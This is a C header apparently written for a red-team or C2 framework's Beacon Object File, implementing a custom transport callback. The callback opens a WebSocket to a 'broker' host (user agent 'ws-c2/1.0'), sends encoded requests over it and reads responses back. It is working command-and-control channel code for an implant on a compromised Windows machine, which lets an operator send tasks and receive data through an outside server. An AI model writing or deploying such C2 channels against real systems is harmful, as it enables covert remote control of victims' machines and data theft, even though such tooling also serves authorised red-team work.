#pragma once

#include <windows.h>
#if !defined(_WININET_H) && !defined(_WININET_)
#include <winhttp.h>
#endif
#include <string.h>

#ifndef KERNEL32$GetProcessHeap
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
#endif
#ifndef KERNEL32$HeapAlloc
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
#endif
#ifndef KERNEL32$HeapReAlloc
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapReAlloc(HANDLE, DWORD, LPVOID, SIZE_T);
#endif
#ifndef KERNEL32$HeapFree
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
#endif
#ifndef KERNEL32$MultiByteToWideChar
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
#endif
#ifndef MSVCRT$printf
DECLSPEC_IMPORT int MSVCRT$printf(const char *format, ...);
#endif
#ifndef MSVCRT$strlen
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *str);
#endif
#ifndef MSVCRT$memcmp
DECLSPEC_IMPORT int MSVCRT$memcmp(const void *buf1, const void *buf2, size_t count);
#endif
#ifndef WINHTTP$WinHttpOpen
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpen(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
#endif
#ifndef WINHTTP$WinHttpConnect
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpConnect(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
#endif
#ifndef WINHTTP$WinHttpOpenRequest
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpenRequest(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR *, DWORD);
#endif
#ifndef WINHTTP$WinHttpSetOption
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSetOption(HINTERNET, DWORD, LPVOID, DWORD);
#endif
#ifndef WINHTTP$WinHttpSendRequest
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSendRequest(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
#endif
#ifndef WINHTTP$WinHttpReceiveResponse
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReceiveResponse(HINTERNET, LPVOID);
#endif
#ifndef WINHTTP$WinHttpWebSocketCompleteUpgrade
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpWebSocketCompleteUpgrade(HINTERNET, DWORD_PTR);
#endif
#ifndef WINHTTP$WinHttpCloseHandle
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpCloseHandle(HINTERNET);
#endif
#ifndef WINHTTP$WinHttpWebSocketShutdown
DECLSPEC_IMPORT HRESULT WINAPI WINHTTP$WinHttpWebSocketShutdown(HINTERNET, USHORT, PVOID, DWORD);
#endif
#ifndef WINHTTP$WinHttpWebSocketSend
DECLSPEC_IMPORT HRESULT WINAPI WINHTTP$WinHttpWebSocketSend(HINTERNET, WINHTTP_WEB_SOCKET_BUFFER_TYPE, PVOID, DWORD);
#endif
#ifndef WINHTTP$WinHttpWebSocketReceive
DECLSPEC_IMPORT HRESULT WINAPI WINHTTP$WinHttpWebSocketReceive(HINTERNET, PVOID, DWORD, DWORD *, WINHTTP_WEB_SOCKET_BUFFER_TYPE *);
#endif

#ifndef WINHTTP_ACCESS_TYPE_NO_PROXY
#define WINHTTP_ACCESS_TYPE_NO_PROXY 1
#endif
#ifndef WINHTTP_NO_PROXY_NAME
#define WINHTTP_NO_PROXY_NAME ((LPCWSTR)NULL)
#endif
#ifndef WINHTTP_NO_PROXY_BYPASS
#define WINHTTP_NO_PROXY_BYPASS ((LPCWSTR)NULL)
#endif
#ifndef WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET
#define WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET 114
#endif
#ifndef WINHTTP_NO_REFERER
#define WINHTTP_NO_REFERER ((LPCWSTR)NULL)
#endif
#ifndef WINHTTP_DEFAULT_ACCEPT_TYPES
#define WINHTTP_DEFAULT_ACCEPT_TYPES ((LPCWSTR *)NULL)
#endif
#ifndef WINHTTP_NO_ADDITIONAL_HEADERS
#define WINHTTP_NO_ADDITIONAL_HEADERS ((LPCWSTR)NULL)
#endif
#ifndef WINHTTP_NO_REQUEST_DATA
#define WINHTTP_NO_REQUEST_DATA ((LPVOID)NULL)
#endif
#ifndef WINHTTP_WEB_SOCKET_BUFFER_TYPE
typedef enum _WINHTTP_WEB_SOCKET_BUFFER_TYPE {
    WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE = 0,
    WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE = 1,
    WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE = 2,
    WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE = 3,
    WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE = 4
} WINHTTP_WEB_SOCKET_BUFFER_TYPE;
#endif
#ifndef WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS
#define WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS 1000
#endif

#ifndef INTERNET_FLAG_SECURE
#define INTERNET_FLAG_SECURE 0x00800000
#endif
#ifndef ERROR_INTERNET_TIMEOUT
#define ERROR_INTERNET_TIMEOUT 12002L
#endif
#ifndef HTTP_QUERY_FLAG_NUMBER
#define HTTP_QUERY_FLAG_NUMBER 0x20000000
#endif
#ifndef HTTP_QUERY_STATUS_CODE
#define HTTP_QUERY_STATUS_CODE 19
#endif
#ifndef HTTP_QUERY_STATUS_TEXT
#define HTTP_QUERY_STATUS_TEXT 20
#endif
#ifndef HTTP_QUERY_RAW_HEADERS
#define HTTP_QUERY_RAW_HEADERS 21
#endif
#ifndef HTTP_QUERY_RAW_HEADERS_CRLF
#define HTTP_QUERY_RAW_HEADERS_CRLF 22
#endif
#ifndef HTTP_QUERY_CONTENT_LENGTH
#define HTTP_QUERY_CONTENT_LENGTH 5
#endif

#define BROKER_PATH "/ws"

static HINTERNET g_hSession = NULL;
static HINTERNET g_hConnect = NULL;
static HINTERNET g_hWebSocket = NULL;
static char g_brokerHost[256];
static INTERNET_PORT g_brokerPort;

static void cleanup_websocket()
{
    if (g_hWebSocket) {
        WINHTTP$WinHttpWebSocketShutdown(g_hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
        WINHTTP$WinHttpCloseHandle(g_hWebSocket);
        g_hWebSocket = NULL;
    }
    if (g_hConnect) {
        WINHTTP$WinHttpCloseHandle(g_hConnect);
        g_hConnect = NULL;
    }
    if (g_hSession) {
        WINHTTP$WinHttpCloseHandle(g_hSession);
        g_hSession = NULL;
    }
}

static BOOL ensure_websocket_connected(const char *host, INTERNET_PORT port)
{
    if (host == NULL || host[0] == '\0') {
        return FALSE;
    }

    SIZE_T hostLenCurrent = MSVCRT$strlen(host);
    SIZE_T hostLenCached  = MSVCRT$strlen(g_brokerHost);

    if (g_hWebSocket != NULL) {
        if (hostLenCurrent == hostLenCached && MSVCRT$memcmp(g_brokerHost, host, hostLenCurrent) == 0 && g_brokerPort == port) {
            return TRUE;
        }
        cleanup_websocket();
    }

    WCHAR hostWide[256] = {0};
    WCHAR pathWide[256] = {0};

    int hostLen = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, host, -1, hostWide, 256);
    int pathLen = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, BROKER_PATH, -1, pathWide, 256);
    if (hostLen == 0 || pathLen == 0) {
        return FALSE;
    }

    g_hSession = WINHTTP$WinHttpOpen(L"ws-c2/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (g_hSession == NULL) {
        return FALSE;
    }

    g_hConnect = WINHTTP$WinHttpConnect(g_hSession, hostWide, port, 0);
    if (g_hConnect == NULL) {
        cleanup_websocket();
        return FALSE;
    }

    HINTERNET hRequest = WINHTTP$WinHttpOpenRequest(
        g_hConnect,
        L"GET",
        pathWide,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (hRequest == NULL) {
        cleanup_websocket();
        return FALSE;
    }

    if (WINHTTP$WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0) == FALSE) {
        WINHTTP$WinHttpCloseHandle(hRequest);
        cleanup_websocket();
        return FALSE;
    }

    if (WINHTTP$WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) == FALSE) {
        WINHTTP$WinHttpCloseHandle(hRequest);
        cleanup_websocket();
        return FALSE;
    }

    if (WINHTTP$WinHttpReceiveResponse(hRequest, NULL) == FALSE) {
        WINHTTP$WinHttpCloseHandle(hRequest);
        cleanup_websocket();
        return FALSE;
    }

    g_hWebSocket = WINHTTP$WinHttpWebSocketCompleteUpgrade(hRequest, 0);
    WINHTTP$WinHttpCloseHandle(hRequest);

    if (g_hWebSocket == NULL) {
        cleanup_websocket();
        return FALSE;
    }

    if (hostLenCurrent >= sizeof(g_brokerHost)) {
        hostLenCurrent = sizeof(g_brokerHost) - 1;
    }

    memcpy(g_brokerHost, host, hostLenCurrent);
    g_brokerHost[hostLenCurrent] = '\0';
    g_brokerPort = port;

    return TRUE;
}

static char *customCallback(const char *encodedRequest, const char *host, INTERNET_PORT port)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
    MSVCRT$printf("[customCallback] received request for %s:%u\n", host ? host : "", (unsigned int)port);

    if (encodedRequest == NULL || reqLen == 0) {
        MSVCRT$printf("[customCallback] no request data to send\n");
        return NULL;
    }

    if (host == NULL || host[0] == '\0') {
        MSVCRT$printf("[customCallback] missing host for websocket connection\n");
        return NULL;
    }

    if (!ensure_websocket_connected(host, port)) {
        MSVCRT$printf("[customCallback] failed to establish websocket connection\n");
        return NULL;
    }

    if (WINHTTP$WinHttpWebSocketSend(
            g_hWebSocket,
            WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
            (PBYTE)encodedRequest,
            reqLen) != ERROR_SUCCESS) {
        MSVCRT$printf("[customCallback] failed to send websocket message\n");
        cleanup_websocket();
        return NULL;
    }

    DWORD bufferSize = 4096;
    char *responseBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, bufferSize);
    if (responseBuf == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for response buffer\n");
        return NULL;
    }

    DWORD totalReceived = 0;

    while (1) {
        BYTE temp[1024];
        DWORD bytesRead = 0;
        WINHTTP_WEB_SOCKET_BUFFER_TYPE bufferType;

        if (WINHTTP$WinHttpWebSocketReceive(g_hWebSocket, temp, sizeof(temp), &bytesRead, &bufferType) != ERROR_SUCCESS) {
            MSVCRT$printf("[customCallback] websocket receive failed\n");
            cleanup_websocket();
            KERNEL32$HeapFree(hHeap, 0, responseBuf);
            return NULL;
        }

        if (bufferType == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) {
            MSVCRT$printf("[customCallback] websocket closed by broker\n");
            cleanup_websocket();
            KERNEL32$HeapFree(hHeap, 0, responseBuf);
            return NULL;
        }

        if (totalReceived + bytesRead + 1 > bufferSize) {
            bufferSize *= 2;
            char *newBuf = (char *)KERNEL32$HeapReAlloc(hHeap, 0, responseBuf, bufferSize);
            if (newBuf == NULL) {
                MSVCRT$printf("[customCallback] realloc failed for response buffer\n");
                KERNEL32$HeapFree(hHeap, 0, responseBuf);
                cleanup_websocket();
                return NULL;
            }
            responseBuf = newBuf;
        }

        memcpy(responseBuf + totalReceived, temp, bytesRead);
        totalReceived += bytesRead;

        if (bufferType == WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE ||
            bufferType == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) {
            break;
        }
    }

    responseBuf[totalReceived] = '\0';
    MSVCRT$printf("[customCallback] received %lu bytes from websocket broker\n", (unsigned long)totalReceived);
    return responseBuf;
}
